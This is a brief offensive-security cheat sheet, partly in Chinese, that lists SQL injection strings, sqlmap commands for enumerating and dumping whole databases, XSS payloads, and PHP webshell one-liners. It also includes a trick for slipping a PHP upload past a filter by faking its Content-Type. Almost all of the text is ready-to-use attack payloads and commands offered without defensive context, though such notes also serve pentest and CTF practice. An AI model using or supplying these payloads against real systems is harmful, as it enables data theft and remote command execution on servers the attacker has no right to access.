# Hacktools

# SQLI
## Easy command
'OR 1=1-- <br>
'OR '1'='1'--'

## Autotools
sqlmap -u "target-url" -p your-parament --random-agent --batch --dbs

```
sqlmap -u "URL" --dbs

# 獲取資料庫所有 table
sqlmap -u "URL" -D database --tables

# 獲取指定 table 之欄位
sqlmap -u "URL" -D database -T table --columns

# 獲取指定 table 之指定欄位資料
sqlmap -u "URL" -D database -T table -C field1,field2 --dump

# 獲取指定 table 之所有欄位資料(就不要-C而已)
sqlmap -u "URL" -D database -T table --dump

# 不指定table，直接獲取該指定DB所有資料
sqlmap -u "URL" -D database --dump-all
```
https://hackmd.io/@bttea/sqlmap_common_parameters

# XSS
```
<script>alert('XSS')</script> 
"><img src=x onerror=alert(1)>

# php file upload webshell
```
```
<?php system($_REQUEST["cmd"]);?> 
<?php echo shell_exec($_GET['cmd']);?> 
```
or <br>
將 Content-Type: application/x-php 換成 /image/jpeg


https://github.com/Kazusa613732/Hitmap-ver.1/blob/main/README.md
